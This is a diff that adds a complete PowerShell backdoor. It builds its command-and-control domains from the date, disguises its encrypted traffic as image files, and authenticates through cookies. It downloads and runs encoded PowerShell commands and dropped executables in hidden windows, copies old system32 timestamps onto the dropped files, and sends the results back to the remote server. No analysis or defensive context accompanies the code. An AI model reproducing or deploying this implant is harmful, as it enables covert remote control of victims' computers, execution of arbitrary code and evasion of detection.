@@ -1,0 +1,928 @@
+$rdict = @(
+	((,'www'), 1, 0),
+	(('*redacted*', '*redacted*', '*redacted*', '*redacted*', '*redacted*', '*redacted*', '*redacted*', '*redacted*', '*redacted*', '*redacted*', '*redacted*'), 1, 0),
+	((,'org'), 1, 0)
+)
+$cdict = @(
+	(('variant', 'excretions', 'accumulators', 'winslow', 'whistleable', 'len', 'undergraduate', 'colleges', 'pies', 'nervous'), 1, 1, 0),
+	(('postscripts', 'miniatures', 'comprehensibility', 'arranger', 'sulphur'), 2, 1, 0),
+	((,'php'), 3, 1, 0)
+)
+$ratio = 100
+$period = 0
+$mseed = 834777
+
+$cPairKey = "BwIAAACkAABSU0EyAAQAAAEAA########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################puUqkU4ElycY0iFBwgZgc5qCD4="
+$sPubKey = "BgIAAACkAABSU0ExA###################################################################################################################################################################sqNjLBJtUmxluGvb2Q=="
+
+$pPass = "ko9######0ue626"
+$usAg = 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+$ckName = 'notified-non-category-notify'
+$ckVal = '1'
+
+
+function isArrayEmpty($arr){return -not ($arr.Count -gt 0)}
+
+function getDateParam($date, $period, $magicseed)
+{
+	$yearnumber = $date.Year
+	$monthnumber = $date.Month
+	$weeknumber = 0
+	if ($period -eq 0)
+	{
+		$daynumber = $date.Day
+		$weeknumber = [math]::Floor(($daynumber - 1) / 7 + 1)
+	}
+	$dateparam = $yearnumber * 17 + $monthnumber * 13 + $weeknumber * 19 + $magicseed
+	return $dateparam;
+}
+
+function generateRndHostName($dateparam, $dict)
+{
+	$r = Get-Random -SetSeed ($dateparam + 131)
+	$res = ''
+	$numberofparts = $dict.Count
+	for ($i = 0; $i -lt $numberofparts; $i++)
+	{
+		$isPartIncluded = $dict[$i][1] -bor (Get-Random) % 2
+		if($isPartIncluded -eq 0) {	continue }
+		
+		$res += $dict[$i][0][(Get-Random)%($dict[$i][0]).Count]
+				
+		$postFixLen = $dict[$i][2]
+		if($postFixLen -ne 0 -and (Get-Random) % 2 -ne 0) { $res += (Get-Random) % ([math]::pow(10, $postFixLen)) }
+		$res += '.'
+	}
+	return $res.TrimEnd('.')
+}
+
+function generateFhHostName($dateparam, $dict)
+{
+	$res = ''
+	if (isArrayEmpty $dict) { return $res }
+	$r = Get-Random -SetSeed ($dateparam + 319)
+	
+	$fixedPart = $dict[0][(Get-Random)%($dict[0]).Count]
+	$preface = $fixedPart[0]
+	$postface = $fixedPart[1]
+	$res += $preface
+	if ($res) { $res += '.' }
+	
+	$userPart = $dict[1][0][(Get-Random)%($dict[1][0]).Count]
+	$res = $res + $userPart
+	$postFixLen = $dict[1][1]
+	if($postFixLen -ne 0 -and (Get-Random) % 2 -ne 0) { $res += (Get-Random) % ([math]::pow(10, $postFixLen)) }
+	if($postface) { $res += '.' }
+	$res += $postface
+	
+	return $res
+}
+
+function generatePathName($dateparam, $dict)
+{
+	$r = Get-Random -SetSeed ($dateparam + 473)
+	$res = ''
+	$numberofparts = $dict.Count
+	for ($i = 0; $i -lt $numberofparts; $i++)
+	{
+		$isPartIncluded = $dict[$i][2] -bor (Get-Random) % 2
+		if($isPartIncluded -eq 0) {	continue }
+		
+		$res += $dict[$i][0][(Get-Random)%($dict[$i][0]).Count]
+				
+		$postFixLen = $dict[$i][3]
+		if($postFixLen -ne 0 -and (Get-Random) % 2 -ne 0) { $res += (Get-Random) % ([math]::pow(10, $postFixLen)) }
+		
+		if($dict[$i][1] -eq 1) {$res += '/'}
+		else {$res += '.'}
+	}
+	return $res.TrimEnd('.')
+}
+
+function generateWorkUrl($dateparam, $r_dict, $f_dict, $c_dict, $ratio)
+{
+	if($c_dict -eq $null -or ($f_dict -eq $null -and $r_dict -eq $null)){return $null}
+	if($c_dict.Count -eq 0 -or ($f_dict.Count -eq 0 -and $r_dict.Count -eq 0)){return $null}
+	$r = Get-Random -SetSeed ($dateparam + 731)
+	if((Get-Random)%100 -ge $ratio){$res += generateFhHostName $dateparam $f_dict}
+	else {$res += generateRndHostName $dateparam $r_dict}
+	return $res + '/' + (generatePathName $dateparam $c_dict)
+}
+
+function getIndexUrl($url)
+{
+	if($url -eq $null -or $url.Length -eq 0)
+	{return $null}
+	try{
+		$indx = $url.IndexOf('/')
+		if(-1 -eq $indx)
+		{$ret = $url}
+        else
+		{$ret = $url.Substring(0, $indx)}
+		if([bool]((Get-Random) % 2) -eq $false)
+		{$ret += ("/index." + (('html', 'php') | Get-Random))}
+		return $ret
+	}
+	catch{return $null}
+}
+
+$vCsLib = 
+@'
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Collections;
+using System.Security.Cryptography;
+using System.IO;
+
+namespace VL
+{
+    public static class VC
+    {
+        private static readonly bool rsaKeyPKCSpadding = false;
+        private static readonly byte[] defaultIV = { 0xae, 0x2f, 0x2d, 0x23, 0xec, 0x15, 0x76, 0x5c, 0xa6, 0x2c, 0x45, 0xef, 0xe3, 0x5b, 0x1e, 0x72 };
+        private static byte[] PerformCrypto(ICryptoTransform crTr, byte[] data)
+        {
+            byte[] ret = null;
+            try
+            {
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (CryptoStream cs = new CryptoStream(ms, crTr, CryptoStreamMode.Write))
+                    {
+                        cs.Write(data, 0, data.Length);
+                        cs.FlushFinalBlock();
+                        ret = ms.ToArray();
+                    }
+                }
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public static byte[] EncryptDataRsa(byte[] data, byte[] pubKey)
+        {
+            byte[] ret = null;
+            try
+            {
+                CspParameters cspParams = new CspParameters(1);
+                RSACryptoServiceProvider prov = new RSACryptoServiceProvider(cspParams);
+                prov.ImportCspBlob(pubKey);
+                ret = prov.Encrypt(data, rsaKeyPKCSpadding);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public static byte[] DecryptDataRsa(byte[] data, byte[] pairKey)
+        {
+            byte[] ret = null;
+            try
+            {
+                CspParameters cspParams = new CspParameters(1);
+                RSACryptoServiceProvider prov = new RSACryptoServiceProvider(cspParams);
+                prov.ImportCspBlob(pairKey);
+                ret = prov.Decrypt(data, rsaKeyPKCSpadding);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public static byte[] HashAndSignDataRsa(byte[] data, byte[] pairKey)
+        {
+            byte[] ret = null;
+            try
+            {
+                CspParameters cspParams = new CspParameters(1);
+                RSACryptoServiceProvider prov = new RSACryptoServiceProvider(cspParams);
+                prov.ImportCspBlob(pairKey);
+                ret = prov.SignData(data, new SHA1CryptoServiceProvider());
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public static bool VerifySignedData(byte[] data, byte[] signature, byte[] pubKey)
+        {
+            bool ret = false;
+            try
+            {
+                CspParameters cspParams = new CspParameters(1);
+                RSACryptoServiceProvider prov = new RSACryptoServiceProvider(cspParams);
+                prov.ImportCspBlob(pubKey);
+                ret = prov.VerifyData(data, new SHA1CryptoServiceProvider(), signature);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public struct AesKeys
+        {
+            public byte[] key;
+            public byte[] iv;
+            public AesKeys(byte[] _encKey, byte[] _iv)
+            {
+                key = _encKey;
+                iv = _iv;
+            }
+        }
+        public static AesKeys CreateNewAesKeys()
+        {
+            AesKeys ret = new AesKeys(null, null);
+            try
+            {
+                RijndaelManaged prov = new RijndaelManaged();
+                prov.GenerateKey();
+                prov.GenerateIV();
+                ret.key = prov.Key;
+                ret.iv = prov.IV;
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public static byte[] EncryptDataAes(byte[] plainData, byte[] key)
+        {
+            byte[] ret = null;
+            byte[] iv = null;
+            try
+            {
+                RijndaelManaged prov = new RijndaelManaged();
+                prov.Key = key;
+                prov.IV = (null == iv) ? defaultIV : iv;
+                ICryptoTransform encr = prov.CreateEncryptor(prov.Key, prov.IV);
+                ret = PerformCrypto(encr, plainData);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public static byte[] DecryptDataAes(byte[] encryptedData, byte[] key)
+        {
+            byte[] ret = null;
+            byte[] iv = null;
+            try
+            {
+                RijndaelManaged prov = new RijndaelManaged();
+                prov.Key = key;
+                prov.IV = (null == iv) ? defaultIV : iv;
+                ICryptoTransform decr = prov.CreateDecryptor(prov.Key, prov.IV);
+                ret = PerformCrypto(decr, encryptedData);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public static byte[] EncryptDataPki(byte[] data, byte[] receiverPubKey, byte[] senderKeyPair)
+        {
+            byte[] ret = null;
+            try
+            {
+                AesKeys aesKeys = CreateNewAesKeys();
+                byte[] aesEncData = EncryptDataAes(data, aesKeys.key);
+                byte[] rsaEncAesKey = EncryptDataRsa(aesKeys.key, receiverPubKey);
+                byte[] dataToSign = new byte[rsaEncAesKey.Length + aesEncData.Length];
+                rsaEncAesKey.CopyTo(dataToSign, 0);
+                aesEncData.CopyTo(dataToSign, rsaEncAesKey.Length);
+                byte[] signature = HashAndSignDataRsa(dataToSign, senderKeyPair);
+                ret = new byte[signature.Length + dataToSign.Length];
+                signature.CopyTo(ret, 0);
+                dataToSign.CopyTo(ret, signature.Length);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public static byte[] DecryptDataPki(byte[] data, byte[] senderPubKey, byte[] receiverKeyPair)
+        {
+            byte[] ret = null;
+            try
+            {
+                if (data.Length <= 256)
+                    return null;
+                byte[] signature = new byte[128];
+                Array.Copy(data, 0, signature, 0, signature.Length);
+                byte[] signedData = new byte[data.Length - 128];
+                Array.Copy(data, 128, signedData, 0, signedData.Length);
+                bool isSignatureOk = VerifySignedData(signedData, signature, senderPubKey);
+                if (!isSignatureOk)
+                    return null;
+                
+                byte[] encryptedAesKey = new byte[128];
+                Array.Copy(signedData, 0, encryptedAesKey, 0, encryptedAesKey.Length);
+                byte[] aesKey = DecryptDataRsa(encryptedAesKey, receiverKeyPair);
+                
+                byte[] encryptedData = new byte[signedData.Length - 128];
+                Array.Copy(signedData, 128, encryptedData, 0, encryptedData.Length);
+                ret = DecryptDataAes(encryptedData, aesKey);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+    }
+
+    public class VP
+    {
+        public string ext;
+        public byte[] sig;
+        public int sigLen = 12;
+        Random rnd;
+
+        public VP()
+        {
+            rnd = new Random();
+        }
+        public struct pCnt
+        {
+            public byte type;
+            public byte[] data;
+        }
+        public string GetExt()
+        {
+            return ext;
+        }
+        public void CreateFS()
+        {
+            try
+            {
+                Dictionary<string, byte[]> knownFS = new Dictionary<string, byte[]>();
+                knownFS.Add("ico", new byte[] { 0x00, 0x00, 0x01, 0x00 });
+                knownFS.Add("gif", new byte[] { 0x47, 0x49, 0x46, 0x38, 0x39, 0x61 });
+                knownFS.Add("jpg", new byte[] { 0xFF, 0xD8, 0xFF });
+                knownFS.Add("png", new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A });
+                knownFS.Add("mp3", new byte[] { 0x49, 0x44, 0x33 });
+                knownFS.Add("bmp", new byte[] { 0x42, 0x4D });
+
+                List<string> keys = new List<string>(knownFS.Keys);
+                string randkey = keys[rnd.Next(keys.Count)];
+                byte[] randsig = knownFS[randkey];
+
+                sig = new byte[sigLen];
+                rnd.NextBytes(sig);
+                randsig.CopyTo(sig, 0);
+                ext = randkey;
+            }
+            catch (System.Exception)
+            { }
+            return;
+        }
+        public byte[] AddFS(byte[] data)
+        {
+            byte[] ret = null;
+            CreateFS();
+            try
+            {
+                ret = new byte[data.Length + sig.Length];
+                sig.CopyTo(ret, 0);
+                data.CopyTo(ret, sig.Length);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public byte[] RemoveFS(byte[] data)
+        {
+            byte[] ret = null;
+            try
+            {
+                ret = new byte[data.Length - sigLen];
+                Array.Copy(data, sigLen, ret, 0, ret.Length);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+
+        public byte[] PD(byte type, byte[] data, byte[] rsaKeyPair, byte[] rsaPubKey)
+        {
+            byte[] ret = null;
+            try
+            {
+                byte[] packageData = new byte[data.Length + 1];
+                packageData[0] = type;
+                Array.Copy(data, 0, packageData, 1, data.Length);
+                byte[] pkiEncData = VC.EncryptDataPki(packageData, rsaPubKey, rsaKeyPair);
+                CreateFS();
+                ret = AddFS(pkiEncData);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+        public pCnt ED(byte[] data, byte[] rsaKeyPair, byte[] rsaPubKey)
+        {
+            pCnt ret = new pCnt();
+            try
+            {
+                byte[] pkiData = RemoveFS(data);
+                byte[] clearData = VC.DecryptDataPki(pkiData, rsaPubKey, rsaKeyPair);
+                ret.type = clearData[0];
+                ret.data = new byte[clearData.Length - 1];
+                Array.Copy(clearData, 1, ret.data, 0, ret.data.Length);
+            }
+            catch (System.Exception)
+            { }
+            return ret;
+        }
+    }
+}
+'@
+
+function extractPayload($data, $rsaKeyPairB64, $rsaSrvPubKeyB64)
+{
+	Try{
+		Add-Type -TypeDefinition $vCsLib
+		$rsaKeyPair = [Convert]::FromBase64String($rsaKeyPairB64)
+		$rsaSrvPubKey = [Convert]::FromBase64String($rsaSrvPubKeyB64)
+		$vp = New-Object -TypeName VL.VP
+		$pldcnt = $vp.ED($data, $rsaKeyPair, $rsaSrvPubKey)
+		if($pldcnt.data -ne $null)
+			{return $pldcnt}
+	}
+	Catch{}
+	return $null
+}
+
+function packResponse($type, $data, $rsaKeyPairB64, $rsaSrvPubKeyB64)
+{
+	Try{
+		Add-Type -TypeDefinition $vCsLib
+		$rsaKeyPair = [Convert]::FromBase64String($rsaKeyPairB64)
+		$rsaSrvPubKey = [Convert]::FromBase64String($rsaSrvPubKeyB64)
+		$vp = New-Object -TypeName VL.VP
+		$packed = $vp.PD($type, $data, $rsaKeyPair, $rsaSrvPubKey)
+		if ($packed -ne $null){
+			$res = @{}
+			$res.pckd = $packed
+			$res.ext = $vp.GetExt()
+			return $res
+		}
+	}
+	Catch{}
+	return $null
+}
+
+function startExe($fullname)
+{
+	try{
+		$p = New-Object System.Diagnostics.Process
+        $p.StartInfo.FileName = $fullName
+        $p.StartInfo.CreateNoWindow = $true
+        $p.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $p.Start() | Out-Null
+        return $p.Id
+	}
+	catch{}
+	return $null
+}
+
+function createRandStr($len, $set)
+{
+	if($len -eq $null -or $set -eq $null){return $null}
+	try{
+		$setArr = $set.ToCharArray()
+		$res = ""
+		for($i=0; $i -lt $len; $i++)
+		{ $res += $setArr | Get-Random }
+		return $res
+	}
+	catch{}
+	return $null
+}
+
+function createExeName ($folderPath=$null)
+{
+	try{
+		if($folderPath -ne $null -and $folderPath.Length -ne 0)
+		{
+			$searchFolder = [Environment]::GetFolderPath($folderPath)
+			for($i=0; $i -lt 60; $i++)
+			{
+				$rndFolder = Get-ChildItem $searchFolder | Get-Random
+				if($rndFolder -is [System.IO.DirectoryInfo] -and $rndFolder.Name -ne 'Microsoft' -and $rndFolder.Name -ne 'Identities' -and !$rndFolder.Name.Contains(' '))
+				{ break }
+				$rndFolder = $null
+			}
+			if($rndFolder -ne $null)
+			{$rndFile = $rndFolder.FullName + '\' + $rndFolder.Name}
+		}
+		else
+		{
+			$tempFile = [IO.Path]::GetTempFileName()
+			[IO.File]::Delete($tempFile)
+			$rndFile = $tempFile.Substring(0, $tempFile.Length - 4)
+		}
+		if($rndFile -eq $null -or $rndFile.Length -eq 0)
+		{ return $null }
+		
+		for($i=0; $i -lt 30; $i++)
+		{
+			if ([IO.File]::Exists($rndFile + '.exe') -ne $true){break}
+			$rndFile += createRandStr 1 'abcdefghijklmnopqrstuvwxyz'
+		}
+		return $rndFile.ToLower() + '.exe'
+	}
+	catch{}
+	return $null
+}
+
+function getRandomOldFileFromSystem32
+{
+	return (gci ((gci env:windir).Value + '\system32') | ? { !$_.PSIsContainer } | Where-Object { $_.LastWriteTime -lt "01/01/2013" } | Get-Random | %{ $_.FullName })
+}
+
+function setFileTime($source, $dest)
+{
+	try{
+		[IO.File]::SetCreationTime($dest, [IO.File]::GetCreationTime($source))
+		[IO.File]::SetLastAccessTime($dest, [IO.File]::GetLastAccessTime($source))
+		[IO.File]::SetLastWriteTime($dest, [IO.File]::GetLastWriteTime($source))
+	}
+	catch{}
+	return
+}
+
+function exePldRoutine($data)
+{
+	try{
+        $fileName = createExeName 'ProgramFiles'
+        [IO.File]::WriteAllBytes($fileName, $data)
+        $writeOk = $true
+    }
+    catch{
+        $fileName = createExeName
+        $writeOk = $false
+    }
+    
+    try{
+		if($writeOk -eq $false)
+        { [IO.File]::WriteAllBytes($fileName, $data) }
+		setFileTime (getRandomOldFileFromSystem32) $fileName
+		$procid = startExe $fileName
+		if($procid -eq $null)
+		{
+			del $fileName
+			return $null
+		}
+		$resStr = '' + $procid + '_' + $fileName
+		$enc = [System.Text.Encoding]::UTF8
+		return $enc.GetBytes($resStr)
+	}
+	catch{}
+	return $null
+}
+
+function parsePsResponse($resp)
+{
+	try{
+		if($resp.GetType().Name -eq 'String')
+		{return $resp}
+		
+		if($resp.GetType().Name -eq 'Object[]')
+		{
+			$ret = ''
+			for($i=0; $i -lt $resp.Count; $i++)
+			{$ret += ($resp[$i] + "`r`n")}
+			return $ret
+		}
+	}
+	catch{}
+	return $null
+}
+
+function psPldRoutine($data)
+{
+	try{
+		$encUtf = [System.Text.Encoding]::UTF8
+		if($data[0] -eq 0xff -and $data[1] -eq 0xfe)
+		{$resp = & powershell.exe -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encUtf.GetString($data).TrimStart()}
+		else
+		{$resp = & powershell.exe -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encUtf.GetString($data)}
+		
+		$parsed = parsePsResponse $resp
+		if($parsed -ne $null)
+		{ return $encUtf.GetBytes($parsed) }
+	}
+	catch{}
+	return $null
+}
+
+function processPayload($type, $data)
+{
+	$ret = @()
+	$ret += , 0x00
+	try{
+		if($type -eq 0x00)
+		{
+			$ret[0] = 0x10
+			$psRes = psPldRoutine $data
+			if($psRes -ne $null)
+			{
+				$ret += , $psRes
+				return $ret
+			}
+		}
+		if($type -eq 0x01)
+		{
+			$ret[0] = 0x20
+			$exeRes = exePldRoutine $data
+			if($exeRes -ne $null)
+			{
+				$ret += , $exeRes
+				return $ret
+			}
+		}
+	}
+	catch{}
+	$ret += , [System.Text.Encoding]::UTF8.GetBytes('_')
+	return $ret
+}
+
+function getDynamicUserAgent()
+{
+	$ret = $null
+	$funcDef = @'
+[DllImport("urlmon.dll")]
+public static extern int ObtainUserAgentString(int option, System.Text.StringBuilder buffer, ref uint size);
+'@
+	try{
+		$urlMon = Add-Type -MemberDefinition $funcDef -Name 'UrlMon' -Namespace 'Win32' -PassThru
+		[uint32]$size = 1024
+		$sb = New-Object System.Text.StringBuilder -ArgumentList @(,[int]$size)
+		$urlMon::ObtainUserAgentString(8, $sb, [ref]$size) | Out-Null
+		$ret = $sb.ToString()
+	}
+	catch{ return $null }
+	return $ret
+}
+
+function getUa($confUa)
+{
+	try{
+		if($confUa -ne $null)
+		{$ua = $confUa} 
+		else
+		{$ua = (getDynamicUserAgent)}
+	}
+	catch{return $null}
+	return $ua
+}
+
+function getConfigCookie($confCkName, $confCkVal)
+{
+	if($confCkName -ne $null -and $confCkVal -ne $null)
+	{return "$confCkName=$confCkVal"}
+	else
+	{return $null}
+}
+
+function getAuthToken($url, $ua, $ck)
+{
+	$ret = $null
+	try{
+		$wc = New-Object System.Net.WebClient
+		if($ua -ne $null)
+		{$wc.Headers.Add("User-Agent", $ua)}
+		if($ck -ne $null)
+		{$wc.Headers.Add("Cookie", $ck)}
+						
+		for ($i=0; $i -lt 2; $i++)
+		{
+			$wc.DownloadData($url)
+			$header = $wc.ResponseHeaders.Get("Set-Cookie");
+			if($header -ne $null)
+			{break;}
+		}
+		if($header -ne $null)
+		{$ret = $header.Substring($header.IndexOf('=') + 1);}
+	}
+	catch{return $null} 
+	return $ret
+}
+
+function getSha1Hash($dataStr)
+{
+	try{
+		$alg = New-Object System.Security.Cryptography.SHA1Managed
+		$hashBytes = $alg.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($dataStr))
+		
+		$sb = New-Object System.Text.StringBuilder
+		for($i=0; $i -lt $hashBytes.Count; $i++)
+		{ $sb.Append($hashBytes[$i].ToString("x2")) | Out-Null }			
+		$ret = $sb.ToString()
+	}
+	catch{return $null}
+	return $ret
+}
+
+function createAuthCookieVal($aToken, $clnPass)
+{
+	if($aToken -eq $null -or $clnPass -eq $null)
+	{return $null}
+	try{
+		return (getSha1Hash ((getSha1Hash $clnPass) + $aToken))
+	}
+	catch{return $null}
+}
+
+function downloadData($url, $ua, $ck)
+{
+	if($url -eq $null -or $url.Count -eq 0){return}
+	try{
+		$wc = New-Object System.Net.WebClient
+		if($ua -ne $null)
+		{$wc.Headers.Add("User-Agent", $ua)}
+		if($ck -ne $null)
+		{$wc.Headers.Add("Cookie", $ck)}
+		$wc.DownloadData($url) | Out-Null
+	}
+	catch{}
+	return
+}
+
+function downloadDataAuth($clnPass, $url, $ua, $ck, $del = $false)
+{
+	if($clnPass -eq $null -or $url -eq $null)
+	{return $null}
+	try{
+		$aToken = (getAuthToken $url $ua $ck)
+		if($aToken -eq $null)
+		{ return $null }
+		
+		$wc = New-Object System.Net.WebClient
+		if($ua -ne $null)
+		{$wc.Headers.Add("User-Agent", $ua)}
+		
+		$cookie = (addCookieToStr $ck ((createAuthCookieVal $aToken $clnPass)))
+		$wc.Headers.Add("Cookie", $cookie)
+		
+		if($del -eq $false)
+		{$useUrl = $url}
+		else
+		{$useUrl = "$url`?$(generateGetParam 1)"}
+		
+		$ret = $wc.DownloadData($useUrl);
+	}
+	catch{ return $null }
+	return $ret
+}
+
+function addCookieToStr($str, $ckVal, $ckName = $null)
+{
+	if($ckName -ne $null)
+	{$cName = $ckName}
+	else
+	{
+		for($i=0; $i -lt 50; $i++)
+		{
+			$cName = (createRandStr (Get-Random -Maximum 4 -Minimum 2) 'abcdefghijklmnopqrstuvwxyz')
+			if($str -eq $null -or $str.Contains("$cName=") -eq $false)
+			{break}
+			$cName = $null
+		}
+	}
+	if($cName -eq $null)
+	{return $null}
+	
+	if($str -ne $null -and $str.Length -ne 0)
+	{$str += ';'}
+	
+	return "$str$cName=$ckVal"
+}
+
+function uploadChunk($dataStr, $clnPass, $url, $ua, $ck, $tsize = $null)
+{
+	if($tsize -eq $null -and $dataStr.Length -ne 2048)
+	{return $false}
+	if($tsize -ne $null -and ($tsize % 2 -ne 0))
+	{return $false}
+	try
+	{
+		$aToken = (getAuthToken $url $ua $ck)
+		if($aToken -eq $null)
+		{ return $false }
+		
+		$wc = New-Object System.Net.WebClient
+		if($ua -ne $null)
+		{$wc.Headers.Add("User-Agent", $ua)}
+		
+		$auCookie = (createAuthCookieVal $aToken $clnPass)
+		$cookie = (addCookieToStr $ck $auCookie)
+		$cookie = (addCookieToStr $cookie $dataStr)
+		$getCount = 3
+		if($tsize -ne $null)
+		{
+			$getCount = 2
+			$cookie = (addCookieToStr $cookie ($tsize / 2))
+		}
+		$wc.Headers.Add("Cookie", $cookie)
+				
+		$wc.DownloadData("$url`?$(generateGetParam $getCount)") | Out-Null
+		$respCk = $wc.ResponseHeaders.Get("Set-Cookie")
+		
+		return (checkRespCk $respCk $auCookie $clnPass)
+	}
+	catch{return $false}
+	return $false
+}
+
+function checkRespCk($toCheck, $baseVal, $clnPass)
+{
+	try{
+		$expVal = getSha1Hash((getSha1Hash $baseVal) + $clnPass)
+		if($expVal -eq $toCheck.Substring($toCheck.IndexOf('=') + 1))
+		{return $true}
+		else
+		{return $false}
+	}
+	catch{return $false}
+}
+
+function generateGetParam($count)
+{
+	if($count -eq $null -or $count -eq 0){ return $null }
+	try{
+		for($k=0; $k -lt 51; $k++)
+		{
+			$names = @()
+			for($i=0; $i -lt $count; $i++)
+			{
+				if((Get-Random)%2 -eq 0)
+				{$names += , (@('id', 's', 'session', 'user', 'uid', 'ssid', 'data', 'search', 'str', 'query', 'filter') | Get-Random)}
+				else
+				{$names += , (createRandStr 1 'abcdefghijklmnopqrstuvwxyz')}
+			}
+			if($names.Count -ne 1)
+            { $names = $names | select -uniq }
+			if($names.Count -eq $count)
+			{break}
+			if($k -eq 50)
+			{return $null}
+		}
+		
+		$ret = ''
+		for($j=0; $j -lt $count; $j++)
+		{
+			$len = Get-Random -Maximum 20 -Minimum 4
+			$val = (createRandStr $len 'abcdefghijklmnopqrstuvwxyz0123456789')
+			$ret += ($names[$j] + "=" + $val)
+			if($j -ne ($count-1))
+			{$ret += "&"}
+		}
+	}
+	catch{return $null}
+	return $ret
+}
+
+function uploadDataAuth($data, $clnPass, $url, $ua, $ck)
+{
+	$dataHexStr = (prepareDataSend $data.pckd)
+	if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or ($dataHexStr.Length % 2) -ne 0)
+	{return $false}
+	
+	try{
+		[uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1
+		for($i=0; $i -lt ($chunks-1); $i++)
+		{
+			if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i, 2048) $clnPass $url $ua $ck))
+			{return $false}
+		}
+		return (uploadChunk $dataHexStr.Substring(2048*($chunks-1)) $clnPass $url $ua $ck $dataHexStr.Length)
+	}
+	catch{return $false}
+}
+
+function prepareDataSend($data)
+{
+	try{
+		if($data.Length -eq 0)
+		{return $null}
+		return ([BitConverter]::ToString($data)).Replace("-","").ToLower() 
+	}
+	catch{return $null}
+}
+
+$ua = (getUa $usAg)
+$ck = (getConfigCookie $ckName $ckVal)
+
+$wUrl = (generateWorkUrl (getDateParam (Get-Date) $period $mseed) $rdict $fdict $cdict $ratio)
+if($wUrl -eq $null -or $wUrl.Length -eq 0) {Exit}
+
+Get-Random -SetSeed ([Environment]::TickCount) | Out-Null
+
+downloadData ('http://' + (getIndexUrl $wUrl)) $ua $ck
+
+$wUrl = 'http://' + $wUrl
+$msg = (downloadDataAuth $pPass $wUrl $ua $ck)
+if($msg -eq $null){Exit}
+else{ downloadDataAuth $pPass $wUrl $ua $ck $true | Out-Null }
+
+$pl = (extractPayload $msg $cPairKey $sPubKey)
+if($pl -eq $null){Exit}
+
+$resp = (processPayload  $pl.type $pl.data)
+$pack = (packResponse $resp[0] $resp[1] $cPairKey $sPubKey)
+
+if((uploadDataAuth $pack $pPass $wUrl $ua $ck) -ne $true)
+{ uploadDataAuth $pack $pPass $wUrl $ua $ck | Out-Null }
